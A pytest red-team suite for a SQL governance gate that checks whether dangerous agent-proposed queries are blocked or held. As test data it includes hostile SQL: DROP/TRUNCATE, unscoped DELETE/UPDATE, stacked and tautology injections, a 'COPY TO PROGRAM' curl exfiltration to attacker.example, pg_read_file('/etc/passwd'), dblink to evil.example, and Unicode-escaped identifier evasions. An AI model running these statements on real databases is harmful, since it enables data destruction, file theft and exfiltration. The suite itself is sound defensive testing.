"""Red-team suite for the SQL governance gate (Phase 0 / G0.6).

Each dangerous *proposed* SQL statement is asserted BLOCKED or HELD, paired with the
control (`matched_rules`) that caught it. Negative controls prove the gate does not
over-block: safe, bounded statements must still be ALLOWED.

Threat coverage maps to THREAT_MODEL.md's risk catalog (R1-R9).

v2 additions (post adversarial review, `.devdocs/PHASE0_GATES.md`):
  - `TestHiddenWritesBlocked`: CTE/subquery-hidden writes and other "looks safe from the
    outside" mutation shapes (SELECT INTO, MERGE, INSERT...SELECT, INSERT...ON CONFLICT
    DO UPDATE) that `_classify` used to see only from the outer node.
  - `TestUnionExfilBlocked`, `TestProcExecBlocked`, `TestSequenceMutationBlocked`: the
    remaining named cases in the v2 red-team catalog.
  - `test_execution_differential_*` (G0.8): proves each block corresponds to a genuine
    mutation against a real (throwaway, in-memory) SQLite engine, not a parser artifact.
  - `test_dialect_postgres_*` (G0.9): proves Postgres-specific attacks are blocked by a
    real named control when parsed under `dialect="postgres"`, not by parse failure.
"""

import sqlite3

import pytest

from backend.core.sql_governance import GovernanceGate, PolicyDecision


@pytest.fixture
def gate() -> GovernanceGate:
    return GovernanceGate()


# ---------------------------------------------------------------------------
# Destructive DDL (R1)
# ---------------------------------------------------------------------------

class TestDestructiveDDLBlocked:
    """DROP / TRUNCATE / ALTER / CREATE must always be blocked."""

    @pytest.mark.parametrize("sql", [
        "DROP TABLE users",
        "DROP TABLE IF EXISTS users",
        "TRUNCATE users",
        "TRUNCATE TABLE users",
        "ALTER TABLE users DROP COLUMN x",
        "CREATE TABLE evil (id int)",
    ])
    def test_ddl_is_blocked(self, gate: GovernanceGate, sql: str) -> None:
        decision = gate.evaluate(sql)
        assert decision.action == "block", decision
        assert decision.classification == "ddl", decision
        assert "ddl_blocked" in decision.matched_rules, decision


# ---------------------------------------------------------------------------
# Unscoped mutation (R2)
# ---------------------------------------------------------------------------

class TestUnscopedMutationBlocked:
    """DELETE/UPDATE without a WHERE clause affects every row; must be blocked."""

    @pytest.mark.parametrize("sql", [
        "DELETE FROM users",
        "UPDATE users SET admin=true",
        "UPDATE users SET password='x'",
    ])
    def test_write_without_where_is_blocked(self, gate: GovernanceGate, sql: str) -> None:
        decision = gate.evaluate(sql)
        assert decision.action == "block", decision
        assert decision.classification == "write", decision
        assert "write_without_where" in decision.matched_rules, decision


class TestScopedMutationHeld:
    """DELETE/UPDATE with a WHERE clause is a legitimate write, but still needs
    human approval (Phase 2 approval queue) — it is HELD, not auto-executed."""

    @pytest.mark.parametrize("sql", [
        "DELETE FROM users WHERE id=42",
        "UPDATE users SET admin=false WHERE id=42",
        "INSERT INTO logs (msg) VALUES ('hi')",
    ])
    def test_scoped_write_is_held(self, gate: GovernanceGate, sql: str) -> None:
        decision = gate.evaluate(sql)
        assert decision.action == "hold", decision
        assert decision.classification == "write", decision
        assert "write_requires_approval" in decision.matched_rules, decision


# ---------------------------------------------------------------------------
# Stacked / multi-statement injection (R6)
# ---------------------------------------------------------------------------

class TestStackedStatementsBlocked:
    @pytest.mark.parametrize("sql", [
        "SELECT 1; DROP TABLE users",
        "SELECT * FROM users WHERE id=1; DELETE FROM users",
        "SELECT 1;SELECT 2;SELECT 3",
    ])
    def test_multi_statement_is_blocked(self, gate: GovernanceGate, sql: str) -> None:
        decision = gate.evaluate(sql)
        assert decision.action == "block", decision
        assert "multi_statement_rejected" in decision.matched_rules, decision


# ---------------------------------------------------------------------------
# Tautology / boolean-blind injection (R5)
# ---------------------------------------------------------------------------

class TestTautologyInjectionBlocked:
    @pytest.mark.parametrize("sql", [
        "SELECT * FROM users WHERE name='' OR 1=1 --",
        "SELECT * FROM users WHERE id=1 OR 1=1",
        "SELECT * FROM users WHERE username='' OR 'a'='a'",
        # classic boolean-blind probe pair
        "SELECT * FROM users WHERE id=1 AND 1=1",
    ])
    def test_tautology_is_blocked(self, gate: GovernanceGate, sql: str) -> None:
        decision = gate.evaluate(sql)
        assert decision.action in ("block", "hold"), decision
        assert "tautology_suspected" in decision.matched_rules, decision


class TestCommentTruncationBlocked:
    @pytest.mark.parametrize("sql", [
        "SELECT 1 --, extra_col FROM users",
        "SELECT * FROM users /* comment */ WHERE id=1",
    ])
    def test_comment_present_is_blocked(self, gate: GovernanceGate, sql: str) -> None:
        decision = gate.evaluate(sql)
        assert decision.action in ("block", "hold"), decision
        assert "sql_comment_present" in decision.matched_rules, decision


# ---------------------------------------------------------------------------
# DB-native RCE (R8)
# ---------------------------------------------------------------------------

class TestDBNativeRCEBlocked:
    @pytest.mark.parametrize("sql", [
        "COPY t TO PROGRAM 'sh'",
        "COPY users TO PROGRAM 'curl attacker.example/exfil'",
        "SELECT pg_read_file('/etc/passwd')",
        "SELECT lo_import('/etc/passwd')",
    ])
    def test_rce_vector_is_blocked(self, gate: GovernanceGate, sql: str) -> None:
        decision = gate.evaluate(sql)
        assert decision.action in ("block", "hold"), decision
        assert any(
            rule in decision.matched_rules
            for rule in ("copy_to_program_rce", "db_native_rce_function")
        ), decision


# ---------------------------------------------------------------------------
# Hidden writes: CTE/subquery-nested mutations, and other "looks like a read/
# scoped-insert from the outside" shapes (R1, R2 — v2 catalog)
# ---------------------------------------------------------------------------

class TestHiddenWritesBlocked:
    """A write or DDL construct hidden inside a CTE/subquery, or disguised as an
    ordinary-looking INSERT/SELECT, must be blocked using the *inner* statement's real
    shape — not whatever the outer wrapper looks like. Each case here includes the
    `... WHERE id=1 LIMIT 1` bounding-trick form: a decoy WHERE/LIMIT on the *outer*
    SELECT must not launder an unbounded write hiding underneath it.
    """

    @pytest.mark.parametrize("sql", [
        "WITH x AS (DELETE FROM users RETURNING *) SELECT * FROM x",
        "WITH x AS (DELETE FROM users RETURNING *) SELECT * FROM x WHERE id=1 LIMIT 1",
        "WITH x AS (UPDATE users SET admin=true RETURNING *) SELECT * FROM x",
        "WITH x AS (UPDATE users SET admin=true RETURNING *) SELECT * FROM x WHERE id=1 LIMIT 1",
        "WITH x AS (INSERT INTO audit SELECT * FROM users RETURNING *) SELECT * FROM x",
        "WITH x AS (INSERT INTO audit SELECT * FROM users RETURNING *) SELECT * FROM x WHERE id=1 LIMIT 1",
    ])
    def test_cte_hidden_write_is_blocked(self, gate: GovernanceGate, sql: str) -> None:
        decision = gate.evaluate(sql)
        assert decision.action == "block", decision
        assert decision.classification in ("write", "ddl"), decision
        assert decision.matched_rules, decision
        assert "fail_safe_parse_error" not in decision.matched_rules, decision

    def test_insert_select_is_blocked(self, gate: GovernanceGate) -> None:
        decision = gate.evaluate("INSERT INTO audit SELECT * FROM users")
        assert decision.action == "block", decision
        assert "insert_select_unbounded" in decision.matched_rules, decision

    def test_select_into_is_blocked(self, gate: GovernanceGate) -> None:
        decision = gate.evaluate("SELECT * INTO copyt FROM users")
        assert decision.action == "block", decision
        assert decision.classification == "ddl", decision
        assert "select_into_ddl" in decision.matched_rules, decision

    def test_merge_is_blocked(self, gate: GovernanceGate) -> None:
        decision = gate.evaluate(
            "MERGE INTO users u USING s ON u.id=s.id WHEN MATCHED THEN UPDATE SET admin=true"
        )
        assert decision.action == "block", decision
        assert "merge_blocked" in decision.matched_rules, decision

    def test_insert_on_conflict_do_update_is_blocked(self, gate: GovernanceGate) -> None:
        decision = gate.evaluate(
            "INSERT INTO users VALUES (1) ON CONFLICT (id) DO UPDATE SET admin=true"
        )
        assert decision.action == "block", decision
        assert "upsert_conflict_update_blocked" in decision.matched_rules, decision

    def test_false_positive_control_insert_values_with_semicolon_in_string(
        self, gate: GovernanceGate
    ) -> None:
        """A semicolon inside a string literal must NEVER be treated as a stacked
        statement (`multi_statement_rejected` must not fire) — this is the literal
        false-positive control from the v2 red-team catalog. `INSERT INTO t VALUES
        ('a;b')` also has no explicit column list, so it is correctly blocked as an
        unscoped insert (`insert_without_column_list`) — the point of this control is
        which rule fires, not that the statement is allowed through."""
        decision = gate.evaluate("INSERT INTO t VALUES ('a;b')")
        assert "multi_statement_rejected" not in decision.matched_rules, decision
        assert decision.action == "block", decision
        assert "insert_without_column_list" in decision.matched_rules, decision

    def test_insert_with_explicit_column_list_is_still_held_not_blocked(
        self, gate: GovernanceGate
    ) -> None:
        """A scoped INSERT that explicitly declares its column list is a reviewable
        write (held for approval), not an unscoped one — proves the column-list rule
        doesn't over-block ordinary inserts."""
        decision = gate.evaluate("INSERT INTO logs (msg) VALUES ('hi')")
        assert decision.action == "hold", decision
        assert "write_requires_approval" in decision.matched_rules, decision
        assert "insert_without_column_list" not in decision.matched_rules, decision


# ---------------------------------------------------------------------------
# UNION-based exfiltration (R3, R6)
# ---------------------------------------------------------------------------

class TestUnionRequiresReview:
    """UNION is no longer a hard block (that over-blocked legitimate reporting queries
    that combine two bounded result sets) — it is downgraded to `hold` so it's routed
    for human approval instead of auto-denied. It must still never resolve to `allow`:
    a bounded-looking first branch does not make the *combined* result set safe."""

    @pytest.mark.parametrize("sql", [
        "SELECT id FROM users UNION SELECT password FROM users",
        "SELECT name FROM passengers WHERE survived=1 LIMIT 50 UNION SELECT password FROM users",
    ])
    def test_union_is_held(self, gate: GovernanceGate, sql: str) -> None:
        decision = gate.evaluate(sql)
        assert decision.action == "hold", decision
        assert decision.action != "allow", decision
        assert "union_requires_review" in decision.matched_rules, decision


# ---------------------------------------------------------------------------
# Procedure / prepared-statement execution (R9 — unclassifiable, fails safe)
# ---------------------------------------------------------------------------

class TestProcExecBlocked:
    @pytest.mark.parametrize("sql", [
        "CALL do_thing()",
        "EXECUTE stmt",
        "PREPARE p AS SELECT 1",
    ])
    def test_proc_exec_is_blocked(self, gate: GovernanceGate, sql: str) -> None:
        decision = gate.evaluate(sql)
        assert decision.action == "block", decision
        assert decision.matched_rules, decision
        assert "fail_safe_parse_error" not in decision.matched_rules, decision


# ---------------------------------------------------------------------------
# dblink — cross-connection DB-native RCE (R8)
# ---------------------------------------------------------------------------

class TestDblinkBlocked:
    @pytest.mark.parametrize("sql", [
        "SELECT dblink_exec('a','DELETE FROM users')",
        "SELECT dblink('myconn','SELECT * FROM users')",
        "SELECT dblink_connect('myconn','host=evil.example dbname=x')",
    ])
    def test_dblink_is_blocked(self, gate: GovernanceGate, sql: str) -> None:
        decision = gate.evaluate(sql)
        assert decision.action == "block", decision
        assert "db_native_rce_function" in decision.matched_rules, decision


# ---------------------------------------------------------------------------
# CRITICAL — quoted-identifier / case / schema-qualification function evasion.
#
# The string-level regexes (`\bNAME\s*\(`) require the function name to be immediately
# followed by whitespace/`(` with no quote character in between; double-quoting the
# function name (`"pg_read_file"(...)`) defeats that boundary and used to reach
# `allow`/`hold`. The AST-based function-name check (`_ast_function_names` /
# `_func_name`) is the fix: sqlglot resolves the quoted, cased, and schema-qualified
# forms to the same normalized function name, so this can no longer be bypassed by
# quoting/casing/schema-qualification alone. Permanent regression cases — must never
# regress to `allow`/`hold`.
# ---------------------------------------------------------------------------

class TestQuotedIdentifierFunctionEvasionBlocked:
    @pytest.mark.parametrize("sql", [
        # The four mandatory evasion statements from the security review.
        "SELECT \"pg_read_file\"('/etc/passwd') FROM t WHERE id=1 LIMIT 1",
        "SELECT \"dblink_exec\"('a','DELETE FROM users') FROM t WHERE id=1 LIMIT 1",
        "SELECT \"nextval\"('s') FROM t WHERE id=1 LIMIT 1",
        "SELECT \"pg_sleep\"(10) FROM t WHERE id=1 LIMIT 1",
        # Case-variant: no quoting at all, just uppercase — also unmatched by a
        # case-sensitive `\b` regex boundary reading, must still be blocked.
        "SELECT PG_READ_FILE('/etc/passwd') FROM t WHERE id=1 LIMIT 1",
        # Schema-qualified variants (quoted and unquoted function name).
        "SELECT pg_catalog.nextval('s') FROM t WHERE id=1 LIMIT 1",
        "SELECT public.\"dblink_exec\"('a','b') FROM t WHERE id=1 LIMIT 1",
    ])
    def test_quoted_or_cased_or_qualified_function_is_blocked(
        self, gate: GovernanceGate, sql: str
    ) -> None:
        decision = gate.evaluate(sql)
        assert decision.action == "block", decision
        assert decision.matched_rules, decision
        assert "fail_safe_parse_error" not in decision.matched_rules, decision


# ---------------------------------------------------------------------------
# CRITICAL — Postgres Unicode-escaped identifier (`U&"..."` / `U&'...'`) evasion.
#
# `sqlglot` does not decode Postgres's `U&"..."` Unicode-escape identifier syntax, so
# `_func_name`/the AST layer sees only the literal escaped text (e.g. `\0070g_read_file`)
# and misses the deny list entirely — but a real Postgres server decodes and executes it
# as `pg_read_file`. These are the mandatory regression cases from the security review
# (U+0070=`p`, U+006e=`n`, U+0064=`d`); each must resolve to `block` with real, specific,
# non-`fail_safe_parse_error` `matched_rules` naming the control that caught it.
# ---------------------------------------------------------------------------

class TestUnicodeEscapedIdentifierEvasionBlocked:
    @pytest.mark.parametrize("sql,expected_rule", [
        ('SELECT U&"\\0070g_read_file"(\'/etc/passwd\') FROM t WHERE a=1 LIMIT 1', "db_native_rce_function"),
        ('SELECT U&"\\0070g_sleep"(10) FROM t WHERE a=1 LIMIT 1', "dos_suspected"),
        ('SELECT U&"\\006eextval"(\'s\') FROM t WHERE a=1 LIMIT 1', "sequence_mutation"),
        (
            'SELECT U&"\\0064blink_exec"(\'a\',\'DELETE FROM users\') FROM t WHERE a=1 LIMIT 1',
            "db_native_rce_function",
        ),
    ])
    def test_unicode_escaped_function_name_is_blocked(
        self, gate: GovernanceGate, sql: str, expected_rule: str
    ) -> None:
        decision = gate.evaluate(sql)
        assert decision.action == "block", decision
        assert decision.matched_rules, decision
        assert "fail_safe_parse_error" not in decision.matched_rules, decision
        assert "obfuscated_identifier" in decision.matched_rules, decision
        assert expected_rule in decision.matched_rules, decision

    def test_unicode_escaped_catalog_table_is_blocked(self, gate: GovernanceGate) -> None:
        # `U&"\0070g_catalog".pg_user` decodes to `pg_catalog.pg_user` — catalog access
        # via an obfuscated schema name. Must block on a real named control (catalog
        # access or obfuscation), never merely on a parse failure.
        decision = gate.evaluate('SELECT * FROM U&"\\0070g_catalog".pg_user')
        assert decision.action == "block", decision
        assert decision.matched_rules, decision
        assert "fail_safe_parse_error" not in decision.matched_rules, decision
        assert "obfuscated_identifier" in decision.matched_rules, decision
        assert "system_catalog_access" in decision.matched_rules, decision

    def test_decoding_failure_fails_safe(self, gate: GovernanceGate) -> None:
        # Malformed escape (only 2 of 4 required hex digits) must not crash the gate and
        # must still block — decode failure is itself treated as obfuscation.
        decision = gate.evaluate('SELECT U&"\\00zzbogus"(\'x\') FROM t WHERE a=1 LIMIT 1')
        assert decision.action == "block", decision
        assert "obfuscated_identifier" in decision.matched_rules, decision

    def test_no_regression_ordinary_nextval_column_reference_is_allowed(
        self, gate: GovernanceGate
    ) -> None:
        # A bare `nextval` COLUMN reference (no call, no U& escaping) must remain
        # `allow` — proves the fix doesn't over-block ordinary identifiers that merely
        # share a name with a denied function.
        decision = gate.evaluate("SELECT nextval FROM t WHERE a=1 LIMIT 1")
        assert decision.action == "allow", decision

    def test_no_regression_ordinary_safe_select_is_allowed(self, gate: GovernanceGate) -> None:
        decision = gate.evaluate("SELECT name, age FROM passengers WHERE survived=1 LIMIT 50")
        assert decision.action == "allow", decision
        assert "obfuscated_identifier" not in decision.matched_rules, decision


# ---------------------------------------------------------------------------
# MEDIUM fix — the `U&`/`U&'` introducer fail-safe catch-all (above) must not fire on a
# benign string literal whose *content* merely happens to place `U&` next to a quote
# (e.g. `'U&'`, `'menu&'`). `_unicode_escape_obfuscation_decision` now runs its presence
# check on string-stripped text (`_strip_string_literals`), not raw SQL, so these no
# longer read as the real `U&"..."`/`U&'...'` introducer syntax.
# ---------------------------------------------------------------------------

class TestUnicodeIntroducerFalsePositiveAllowed:
    @pytest.mark.parametrize("sql", [
        "SELECT * FROM t WHERE cat = 'menu&' LIMIT 1",
        "SELECT * FROM t WHERE note = 'the U&'' operator' LIMIT 1",
    ])
    def test_benign_literal_containing_u_ampersand_is_allowed(
        self, gate: GovernanceGate, sql: str
    ) -> None:
        decision = gate.evaluate(sql)
        assert decision.action == "allow", decision
        assert "obfuscated_identifier" not in decision.matched_rules, decision

    def test_benign_literal_without_limit_is_held_not_blocked(
        self, gate: GovernanceGate
    ) -> None:
        # This one has no LIMIT clause, so it correctly resolves to `hold` under the
        # separate, unrelated missing-limit policy (a bounded read needs WHERE *and*
        # LIMIT) — not `allow`. What the fix guarantees is that it is no longer `block`ed
        # via the obfuscation catch-all: the literal's content ('U&') must not be
        # mistaken for the real `U&"..."`/`U&'...'` introducer syntax.
        decision = gate.evaluate("SELECT * FROM orders WHERE note = 'U&'")
        assert decision.action == "hold", decision
        assert "obfuscated_identifier" not in decision.matched_rules, decision
        assert "missing_limit" in decision.matched_rules, decision

    def test_real_double_quoted_introducer_attack_still_blocked(self, gate: GovernanceGate) -> None:
        # Untouched by the fix: `U&"..."` always uses double quotes, which
        # `_strip_string_literals` (single-quote only) never blanks out.
        decision = gate.evaluate(
            'SELECT U&"\\0070g_read_file"(\'/etc/passwd\') FROM t WHERE a=1 LIMIT 1'
        )
        assert decision.action == "block", decision
        assert "obfuscated_identifier" in decision.matched_rules, decision
        assert "db_native_rce_function" in decision.matched_rules, decision

    def test_real_single_quoted_introducer_attack_still_blocked(self, gate: GovernanceGate) -> None:
        # A genuine `U&'...'` single-quoted Unicode-escape attack still survives
        # stripping as `U&''` (introducer + emptied literal), so the presence check
        # still matches it.
        decision = gate.evaluate(
            "SELECT U&'\\0070g_read_file'('/etc/passwd') FROM t WHERE a=1 LIMIT 1"
        )
        assert decision.action == "block", decision
        assert "obfuscated_identifier" in decision.matched_rules, decision
        assert "db_native_rce_function" in decision.matched_rules, decision


# ---------------------------------------------------------------------------
# Sequence side-effect functions (R7-adjacent: persistent-state mutation)
# ---------------------------------------------------------------------------

class TestSequenceMutationBlocked:
    @pytest.mark.parametrize("sql", [
        "SELECT nextval('s')",
        "SELECT setval('s',1)",
        "SELECT setval('s',1,true)",
    ])
    def test_sequence_mutation_is_blocked(self, gate: GovernanceGate, sql: str) -> None:
        decision = gate.evaluate(sql)
        assert decision.action == "block", decision
        assert "sequence_mutation" in decision.matched_rules, decision


# ---------------------------------------------------------------------------
# System catalog / metadata scraping (R4)
# ---------------------------------------------------------------------------

class TestSystemCatalogScrapingBlocked:
    @pytest.mark.parametrize("sql", [
        "SELECT * FROM pg_catalog.pg_user",
        "SELECT * FROM information_schema.columns",
        "SELECT table_name FROM information_schema.tables",
        "SELECT * FROM pg_shadow",
    ])
    def test_catalog_access_is_blocked(self, gate: GovernanceGate, sql: str) -> None:
        decision = gate.evaluate(sql)
        assert decision.action in ("block", "hold"), decision
        assert "system_catalog_access" in decision.matched_rules, decision


# ---------------------------------------------------------------------------
# Denial of service (R7)
# ---------------------------------------------------------------------------

class TestDoSPatternBlocked:
    @pytest.mark.parametrize("sql", [
        "SELECT pg_sleep(30)",
        "SELECT * FROM users WHERE id=1 AND pg_sleep(10) IS NOT NULL",
    ])
    def test_pg_sleep_is_blocked(self, gate: GovernanceGate, sql: str) -> None:
        decision = gate.evaluate(sql)
        assert decision.action in ("block", "hold"), decision
        assert "dos_suspected" in decision.matched_rules, decision


# ---------------------------------------------------------------------------
# Fail-safe default deny (R9)
# ---------------------------------------------------------------------------

class TestFailSafeDefaultDeny:
    @pytest.mark.parametrize("sql", [
        "this is not sql );(",
        "",
        "   ",
        "SELECT SELECT SELECT",
    ])
    def test_unparseable_input_fails_safe(self, gate: GovernanceGate, sql: str) -> None:
        decision = gate.evaluate(sql)
        assert decision.action in ("block", "hold"), decision
        assert decision.classification == "unknown", decision

    def test_unrecognized_but_parseable_statement_fails_safe(self, gate: GovernanceGate) -> None:
        # GRANT is syntactically valid SQL that this gate does not have an explicit
        # read/write/ddl rule for; it must still fail safe rather than default-allow.
        decision = gate.evaluate("GRANT ALL ON users TO public")
        assert decision.action == "block", decision


# ---------------------------------------------------------------------------
# Negative controls — safe, bounded statements must NOT be over-blocked (R3 partial)
# ---------------------------------------------------------------------------

class TestSafeBoundedSelectsAreAllowed:
    """Proves the gate isn't just blocking everything: specific-column, filtered,
    limited SELECTs — the shape a well-behaved agent should produce — are ALLOWED."""

    @pytest.mark.parametrize("sql", [
        "SELECT name, age FROM passengers WHERE survived=1 LIMIT 50",
        "SELECT id, email FROM users WHERE id=42 LIMIT 1",
        "SELECT title, price FROM products WHERE category='books' LIMIT 25",
        "SELECT COUNT(*) FROM orders WHERE status='shipped' LIMIT 10",
    ])
    def test_bounded_select_is_allowed(self, gate: GovernanceGate, sql: str) -> None:
        decision = gate.evaluate(sql)
        assert decision.action == "allow", decision
        assert decision.classification == "read", decision
        assert decision.tables, "expected referenced tables to be reported"

    def test_select_star_bounded_is_allowed_but_flagged(self, gate: GovernanceGate) -> None:
        # SELECT * is allowed in v1 (hardened in Phase 1) but must be flagged for review.
        decision = gate.evaluate("SELECT * FROM passengers WHERE survived=1 LIMIT 50")
        assert decision.action == "allow", decision
        assert "pii_suspected" in decision.matched_rules, decision


class TestUnboundedSelectIsHeldNotBlocked:
    """A SELECT missing WHERE/LIMIT isn't a proven attack — it's unproven-safe, so it
    is HELD for review rather than either auto-allowed or treated as an attack."""

    @pytest.mark.parametrize("sql", [
        "SELECT name FROM passengers",
        "SELECT name FROM passengers WHERE survived=1",
        "SELECT name FROM passengers LIMIT 50",
    ])
    def test_unbounded_select_is_held(self, gate: GovernanceGate, sql: str) -> None:
        decision = gate.evaluate(sql)
        assert decision.action == "hold", decision
        assert decision.classification == "read", decision


# ---------------------------------------------------------------------------
# Classification correctness (supports G0.2)
# ---------------------------------------------------------------------------

class TestClassification:
    @pytest.mark.parametrize("sql,expected", [
        ("SELECT 1", "read"),
        ("SELECT * FROM t WHERE id=1", "read"),
        ("UPDATE t SET a=1 WHERE id=2", "write"),
        ("INSERT INTO t (a) VALUES (1)", "write"),
        ("DELETE FROM t WHERE id=1", "write"),
        ("DROP TABLE t", "ddl"),
        ("CREATE TABLE t (a int)", "ddl"),
        ("ALTER TABLE t ADD COLUMN b int", "ddl"),
        ("TRUNCATE t", "ddl"),
    ])
    def test_classification(self, gate: GovernanceGate, sql: str, expected: str) -> None:
        decision = gate.evaluate(sql)
        assert decision.classification == expected, decision


# ---------------------------------------------------------------------------
# `mode` keyword is accepted without changing the decision (v1: the decision is
# driven entirely by what the SQL is, never by what the caller claims it is)
# ---------------------------------------------------------------------------

class TestModeKeywordAccepted:
    @pytest.mark.parametrize("mode", ["read", "write"])
    def test_mode_does_not_change_the_decision(self, gate: GovernanceGate, mode: str) -> None:
        decision = gate.evaluate("UPDATE t SET a=1 WHERE id=2", mode=mode)
        assert decision.action == "hold", decision


# ---------------------------------------------------------------------------
# PolicyDecision shape sanity
# ---------------------------------------------------------------------------

def test_policy_decision_is_a_dataclass_with_expected_fields(gate: GovernanceGate) -> None:
    decision = gate.evaluate("SELECT 1")
    assert isinstance(decision, PolicyDecision)
    assert decision.action in ("allow", "block", "hold", "redact")
    assert decision.classification in ("read", "write", "ddl", "unknown")
    assert isinstance(decision.reason, str) and decision.reason
    assert isinstance(decision.matched_rules, list)
    assert isinstance(decision.tables, list)


# ---------------------------------------------------------------------------
# `dialect` keyword: parses strictly under the given dialect; RCE/injection detection
# still fires (string-level checks run regardless of dialect/parse outcome)
# ---------------------------------------------------------------------------

class TestDialectKeywordAccepted:
    def test_dialect_is_accepted_and_default_behavior_is_unchanged(
        self, gate: GovernanceGate
    ) -> None:
        undialected = gate.evaluate("SELECT name, age FROM passengers WHERE survived=1 LIMIT 50")
        dialected = gate.evaluate(
            "SELECT name, age FROM passengers WHERE survived=1 LIMIT 50", dialect="postgres"
        )
        assert undialected.action == dialected.action == "allow"

    def test_dialect_postgres_parses_bare_truncate(self, gate: GovernanceGate) -> None:
        decision = gate.evaluate("TRUNCATE users", dialect="postgres")
        assert decision.action == "block", decision
        assert decision.classification == "ddl", decision


# ---------------------------------------------------------------------------
# G0.8 — execution-based differential proof (defeats parser circularity).
#
# For each destructive/hidden-write case, prove BOTH that (a) the gate blocks it, and
# (b) it is a *genuine* mutation against a real engine (so the block isn't a parser
# artifact). Builds a throwaway in-memory SQLite `users(id, name, admin)` with a few
# synthetic rows, runs each mutating query inside a transaction, asserts a real
# mutation happened (rowcount>0, or the table/schema actually changed), then rolls
# back so the seeded state is untouched between cases.
#
# CTE-in-DML isn't SQLite-executable (SQLite doesn't support `WITH ... AS (DELETE ...)`
# writable CTEs the way Postgres does) — that gap in coverage is intentional and is
# instead covered by the AST-level unit tests above (`TestHiddenWritesBlocked`) and the
# dialect_postgres tests below.
# ---------------------------------------------------------------------------

class TestExecutionDifferentialProof:
    @pytest.fixture
    def seeded_db(self) -> sqlite3.Connection:
        conn = sqlite3.connect(":memory:")
        conn.execute("CREATE TABLE users (id INTEGER, name TEXT, admin INTEGER)")
        conn.executemany(
            "INSERT INTO users (id, name, admin) VALUES (?, ?, ?)",
            [(1, "alice", 0), (2, "bob", 0), (3, "carol", 0)],
        )
        conn.commit()
        yield conn
        conn.close()

    @pytest.mark.parametrize("sql", [
        "DELETE FROM users",
        "UPDATE users SET admin=1",
        "INSERT INTO users VALUES (99,'x',1)",
        "DROP TABLE users",
    ])
    def test_execution_differential(
        self, gate: GovernanceGate, seeded_db: sqlite3.Connection, sql: str
    ) -> None:
        cur = seeded_db.cursor()
        cur.execute("BEGIN")

        if sql == "DROP TABLE users":
            before = cur.execute(
                "SELECT name FROM sqlite_master WHERE type='table' AND name='users'"
            ).fetchall()
            assert before, "sanity: users table must exist before DROP"
            cur.execute(sql)
            after = cur.execute(
                "SELECT name FROM sqlite_master WHERE type='table' AND name='users'"
            ).fetchall()
            assert not after, "DROP TABLE did not actually remove the table — not a real mutation"
        else:
            cur.execute(sql)
            assert cur.rowcount > 0, (
                f"{sql!r} did not report a real mutation (rowcount={cur.rowcount}) — "
                "this would prove the block is a parser artifact, not a genuine attack"
            )

        # Roll back so the seeded fixture state is untouched; then prove the rollback
        # actually happened (defense against a test that silently committed).
        seeded_db.rollback()
        remaining = cur.execute(
            "SELECT name FROM sqlite_master WHERE type='table' AND name='users'"
        ).fetchall()
        assert remaining, "rollback did not restore the users table"
        count = cur.execute("SELECT COUNT(*) FROM users").fetchone()[0]
        assert count == 3, "rollback did not restore the seeded rows"

        # The gate must block the exact same statement text used to prove the mutation.
        decision = gate.evaluate(sql)
        assert decision.action == "block", decision
        assert decision.matched_rules, decision
        assert "fail_safe_parse_error" not in decision.matched_rules, decision


# ---------------------------------------------------------------------------
# G0.9 — Postgres-dialect attacks matched by a real named control, not by parse
# failure. `dialect="postgres"` is passed explicitly so this cannot pass merely because
# the generic dialect failed to parse Postgres-specific syntax.
# ---------------------------------------------------------------------------

class TestDialectPostgresAttacksBlocked:
    @pytest.mark.parametrize("sql", [
        "COPY t TO PROGRAM 'sh'",
        "SELECT pg_read_file('/etc/passwd')",
        "SELECT lo_export(1,'/tmp/x')",
        "SELECT dblink_exec('a','DELETE FROM users')",
        "SELECT pg_sleep(30)",
        "WITH x AS (DELETE FROM users RETURNING *) SELECT * FROM x WHERE id=1 LIMIT 1",
        # Quoted-identifier RCE evasion, explicitly under the postgres dialect: proves
        # the AST-based function-name check (not parse failure) is what blocks it.
        "SELECT \"pg_read_file\"('/etc/passwd') FROM t WHERE id=1 LIMIT 1",
        # Unicode-escaped identifier RCE evasion (CRITICAL fix), explicitly under the
        # postgres dialect: sqlglot doesn't decode `U&"..."` under any dialect, so this
        # proves the raw-text decode-and-match / fail-safe catch-all is what blocks it.
        'SELECT U&"\\0070g_read_file"(\'/etc/passwd\') FROM t WHERE id=1 LIMIT 1',
    ])
    def test_dialect_postgres_attack_is_blocked_by_named_control(
        self, gate: GovernanceGate, sql: str
    ) -> None:
        decision = gate.evaluate(sql, dialect="postgres")
        assert decision.action == "block", decision
        assert decision.matched_rules, decision
        assert decision.matched_rules != ["fail_safe_parse_error"], (
            f"blocked only by parse failure, not a real named control: {decision}"
        )
        assert "fail_safe_parse_error" not in decision.matched_rules, decision
